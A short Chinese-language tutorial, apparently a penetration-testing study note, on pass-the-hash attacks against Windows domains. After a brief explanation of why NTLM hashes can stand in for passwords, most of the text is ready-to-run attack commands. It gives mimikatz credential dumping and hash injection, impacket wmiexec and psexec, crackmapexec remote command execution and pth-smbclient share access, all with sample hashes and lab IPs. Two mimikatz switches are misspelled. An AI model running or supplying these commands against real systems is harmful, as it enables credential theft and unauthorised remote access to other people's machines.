    一、简介

      首先，在 Windows Server 2012 R2 及之后版本的操作系统中，lsass.exe 进程中是无法抓到明文密码的，只能抓到 NTLM hash；其次，当我们拿到hash后，很多时候没办法跑出明文密码。此时就需要 PTH 了。

    二、PTH的好处

      通过 PTH，攻击者并不需要花时间去破解出明文。

    三、PTH分析

      散列值的概念：当用户登录一个网站的时候，如果该网站使用的是明文密码来保存密码，那么一旦网站被攻破，所有用户的明文密码都会被泄露，所有就产生了散列值的概念。
      哈希传递攻击的前提：有管理员的 NTLM Hash ，并且目标机器开放445端口。
      Windows Vista之后的机器，只能通过 administrator 用户的 hash 才能进行哈希传递攻击（此处的administrator指的是 SID 为 500的用户，因为大多数情况administrator会改名，但是SID不会改变）。

    四、mimikatz 进行 PTH

      如果需要使用mimikatz进行 PTH 攻击，我们必须要有域管的hash和域内一台主机的管理员权限：

    mimikatz
privilege::debug
log
sekurlsa::logonpasswords
sekurlsa::pth /doamin:<domain> /user:administrator /ntlm:<ntlm>
net time /domian
net use //dc.laobai.com/ipc$
dir //dc.laobai.com/c$



    五、impacket 进行 PTH

      kali自带的impacket工具包也可以进行PTH

    impacket-wmiexec -hashes :d443411bcb8c76df6804b1f8c500581e administrator@192.168.48.131

impacket-psexec -hashes :d443411bcb8c76df6804b1f8c500581e administrator@192.168.48.131


    六、crackmapexec 进行PTH

    crackmapexec smb 192.168.48.131 -u user1 -H 3b24c391862f4a8531a245a0217708c4 -x 'ipconfig'

    七、使用pth-smbclient进行PTH

    pth-smbclient -U laobai/user1%00000000000000000000000000000000:3b24c391862f4a8531a245a0217708c4 //192.168.48.131/c$
